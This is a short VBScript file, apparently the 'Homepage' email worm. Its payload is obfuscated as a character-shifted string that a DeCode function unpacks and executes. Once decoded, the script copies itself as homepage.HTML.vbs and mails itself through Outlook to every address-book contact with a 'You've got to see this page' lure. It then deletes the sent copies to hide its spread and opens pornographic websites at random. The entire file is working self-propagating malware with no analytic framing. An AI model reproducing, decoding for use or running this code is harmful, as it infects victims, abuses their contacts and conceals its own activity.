Execute DeCode("QpGttqtTguwogPgzvUgvYU?EtgcvgQdlgev*$YUetkrv0Ujgnn$+UgvHUQ?Etgcvgqdlgev*$uetkrvkpi0hkngu{uvgoqdlgev$+Hqnfgt?HUQ0IgvUrgekcnHqnfgt*4+UgvKpH?HUQ0QrgpVgzvHkng*YUetkrv0UetkrvHwnnpcog.3+FqYjkngKpH0CvGpfQhUvtgco>@VtwgUetkrvDwhhgt?UetkrvDwhhgt(KpH0TgcfNkpg(xdetnhNqqrUgvQwvH?HUQ0QrgpVgzvHkng*Hqnfgt($^jqogrcig0JVON0xdu$.4.vtwg+QwvH0ytkvgUetkrvDwhhgtQwvH0enqugUgvHUQ?PqvjkpiKhYU0tgitgcf*$JMEW^uqhvyctg^Cp^ockngf$+>@$3$vjgpOcknkv*+GpfKhUgvu?EtgcvgQdlgev*$Qwvnqqm0Crrnkecvkqp$+Ugvv?u0IgvPcogUrceg*$OCRK$+Ugvw?v0IgvFghcwnvHqnfgt*8+Hqtk?3vqw0kvgou0eqwpvKhw0Kvgou0Kvgo*k+0uwdlgev?$Jqogrcig$Vjgpw0Kvgou0Kvgo*k+0enqugw0Kvgou0Kvgo*k+0fgngvgGpfKhPgzvUgvw?v0IgvFghcwnvHqnfgt*5+Hqtk?3vqw0kvgou0eqwpvKhw0Kvgou0Kvgo*k+0uwdlgev?$Jqogrcig$Vjgpw0Kvgou0Kvgo*k+0fgngvgGpfKhPgzvTcpfqok|gt?Kpv**6,Tpf+-3+Kht?3vjgpYU0Twp*$jvvr<11jctfeqtg0rqtpdknndqctf0pgv1ujcppqp130jvo$+gnugkht?4VjgpYU0Twp*$jvvr<11ogodgtu0pdek0eqo1aZOEO1rtkp|lg130jvo$+gnugkht?5VjgpYU0Twp*$jvvr<11yyy40ugzetqrqnku0eqo1cocvgwt1ujgknc130jvo$+GnugKht?6VjgpYU0Twp*$jvvr<11ujgknc0kuugz{0vx130jvo$+GpfKhHwpevkqpOcknkv*+QpGttqtTguwogPgzvUgvQwvnqqm?EtgcvgQdlgev*$Qwvnqqm0Crrnkecvkqp$+KhQwvnqqm?$Qwvnqqm$VjgpUgvOcrk?Qwvnqqm0IgvPcogUrceg*$OCRK$+UgvNkuvu?Ocrk0CfftguuNkuvuHqtGcejNkuvKpfgzKpNkuvuKhNkuvKpfgz0CfftguuGpvtkgu0Eqwpv>@2VjgpEqpvcevEqwpv?NkuvKpfgz0CfftguuGpvtkgu0EqwpvHqtEqwpv?3VqEqpvcevEqwpvUgvOckn?Qwvnqqm0EtgcvgKvgo*2+UgvEqpvcev?NkuvKpfgz0CfftguuGpvtkgu*Eqwpv+Ockn0Vq?Eqpvcev0CfftguuOckn0Uwdlgev?$Jqogrcig$Ockn0Dqf{?xdetnh($Jk#$(xdetnh(xdetnh($[qw)xgiqvvquggvjkurcig#Kv)utgcnn{eqqn=Q+$(xdetnh(xdetnhUgvCvvcejogpv?Ockn0CvvcejogpvuCvvcejogpv0CffHqnfgt($^jqogrcig0JVON0xdu$Ockn0FgngvgChvgtUwdokv?VtwgKhOckn0Vq>@$$VjgpOckn0UgpfYU0tgiytkvg$JMEW^uqhvyctg^Cp^ockngf$.$3$GpfKhPgzvGpfKhPgzvGpfkhGpfHwpevkqp")
Function DeCode(Coded)
For I = 1 To Len(Coded)
CurChar= Mid(Coded, I, 1)
If Asc(CurChar) = 15 Then
CurChar= Chr(10)
ElseIf Asc(CurChar) = 16 Then
CurChar= Chr(13)
ElseIf Asc(CurChar) = 17 Then
CurChar= Chr(32)
ElseIf Asc(CurChar) = 18 Then
CurChar= Chr(9)
Else
CurChar = Chr(Asc(CurChar) - 2)
End If
DeCode = DeCode & CurChar
Next
End Function
